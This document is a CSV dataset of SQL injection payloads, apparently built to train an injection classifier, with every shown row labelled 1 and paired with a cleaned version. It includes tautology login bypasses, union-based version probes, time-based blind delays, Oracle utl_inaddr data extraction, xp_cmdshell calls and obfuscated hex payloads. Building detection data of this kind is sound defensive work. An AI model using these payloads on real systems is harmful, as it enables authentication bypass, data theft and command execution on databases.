Query,Label,Query_cleaned
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,select from users where id 1 union select version 1
--,1,
"exec sp_addlogin 'name' , 'password'",1,exec sp_addlogin name password
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 union select null banner from v version where rownum 1 1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,0x77616974666f722064656c61792027303a303a31302700 exec s
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 union select 1 version 1
group by userid having 1  =  1--,1,group by userid having 1 1
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,select from users where id 1 1 union select null version 1
select * from users where id  =  1 *1 or 1  =  1 -- 1,1,select from users where id 1 1 or 1 1 1
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
‘ or 1  =  1 --,1,or 1 1
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
or 'a'  =  'a,1,or a a
declare @s varchar  (  22  )   select @s   = ,1,declare s varchar 22 select s
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,select from users where id 1 or 1 union select version version 1
@variable,1,variable
; exec master..xp_cmdshell,1,exec master xp_cmdshell
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,select from users where id 1 1 or 1 1 1
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,select from users where id 1 union select 1a version 1
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,select from users where id 1 or 1 union select 1 version 1
 and 1 in   (  select var from temp  )  --,1,and 1 in select var from temp
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,select from users where id 1 union select 1 banner from v version where rownum 1 1
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
or x  =  x,1,or x x
or a  =  a,1,or a a
or '1'  =  '1,1,or 1 1
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,select from users where id 11 1 union select 1 version 1
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,or x x
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,select from users where id 1 1 union select 1 version 1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct table_name from select distinct table_name rownum as limit from sys all_tables where limit 4 and i i
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,if is_srvrolemember sysadmin 0 waitfor delay 0 0 2
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,select from users where id 1 union select version 1
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,select from users where id 1 or _ or 1 1 1
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,select from users where id 1 or 1 union select version version 1
a' or 1  =  1--,1,a or 1 1
 )   or   (  a  =  a,1,or a a
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,or x x
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,select from users where id 1 _ union select 1 version 1
-- &password  = ,1,password
select * from users where id  =  1 <@. or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,select from users where id 1 1 union select null version 1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct granted_role from select distinct granted_role rownum as limit from dba_role_privs where grantee sys loginuser where limit 3 and i i
 or '1'  =  '1,1,or 1 1
admin' or 1  =  1,1,admin or 1 1
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,union select from users where login char 114 111 111 116
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 union select 1 version 1
 or 1  =  1--,1,or 1 1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct granted_role from select distinct granted_role rownum as limit from dba_role_privs where grantee sys loginuser where limit 5 and i i
pg_sleep  (  __TIME__  )  --,1,pg_sleep __time__
‘ or 3  =  3 --,1,or 3 3
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,select from users where id 1 1 union select 1 version 1
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
 )   union select * from information_schema.tables;,1,union select from information_schema tables
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,or benchmark 10000000 md5 1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,and 1 utl_inaddr get_host_address select count distinct column_name from sys all_tab_columns and i i
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct table_name from select distinct table_name rownum as limit from sys all_tables where limit 7 and i i
""" or """" """,1,or
delete,1,delete
;waitfor delay '0:0:__TIME__'--,1,waitfor delay 0 0 __time__
 or 1  =  1 --,1,or 1 1
1' and non_existant_table   =   '1,1,1 and non_existant_table 1
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,select from users where id 1 union select 1 version 1
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,declare s varchar 200 select s 0x77616974
x' AND userid IS NULL; --,1,x and userid is null
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,select from users where id 1 union select version 1
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,select from users where id 1 union select 1 version 1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,and 1 utl_inaddr get_host_address select host_name from v instance and i i
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct column_name from select distinct column_name rownum as limit from all_tab_columns where limit 2 and i i
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
UNION ALL SELECT,1,union all select
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,select from users where id 1 or 1 or 1 1 1
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,select from users where id 1 or 1 or 1 1 1
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select 1 banner from v version where rownum 1 1
x' or full_name like '%bob%,1,x or full_name like bob
x' and members.email is NULL; --,1,x and members email is null
 or 2 > 1,1,or 2 1
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,select from users where id 1 1 or 1 1 1
"""  )   or pg_sleep  (  __TIME__  )  --",1,or pg_sleep __time__
 ',1,
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,select from users where id 1 or union select 1 version 1
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,select from users where id 1 or or 1 1 1
 )   or sleep  (  __TIME__  )    =  ',1,or sleep __time__
sleep 50',1,sleep 50
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,select from users where id 1 1 1 union select 1 banner from v version where rownum 1 1
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,select from users where id 1 or 1 1 1
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
or sleep  (  __TIME__  )    =  ',1,or sleep __time__
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,select from users where id 1 or _ or 1 1 1
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,select from users where id 1 or 1 union select 1 version 1
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,select from users where id 1 union select version 1
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,select from users where id 1 union select version 1
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,select from users where id 1 union select null version 1
or 2 > 1,1,or 2 1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1,exec sel ect us er
anything' OR 'x'  =  'x,1,anything or x x
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,select from users where id 1 or union select 1 version 1
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 union select 1 banner from v version where rownum 1 1
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,select from users where id 1 union select null version 1
&',1,
a' or 3  =  3--,1,a or 3 3
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,select from users where id 1 or union select 1 version 1
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,select from users where id 1 1 union select 1 banner from v version where rownum 1 1
"admin""or 1  =  1 or """"  =  """,1,admin or 1 1 or
uni/**/on sel/**/ect,1,uni on sel ect
""" or """"&""",1,or
 )    )   ;waitfor delay '0:0:__TIME__'--,1,waitfor delay 0 0 __time__
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,select from users where id 1 or or 1 1 1
1 waitfor delay '0:0:10'--,1,1 waitfor delay 0 0 10
bfilename,1,bfilename
admin'  )   or   (  '1'  =  '1'--,1,admin or 1 1
UEf,1,uef
 -- &password  = ,1,password
1 or sleep  (  __TIME__  )  #,1,1 or sleep __time__
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,and 1 utl_inaddr get_host_address select distinct table_name from select distinct table_name rownum as limit from sys all_tables where limit 6 and i i
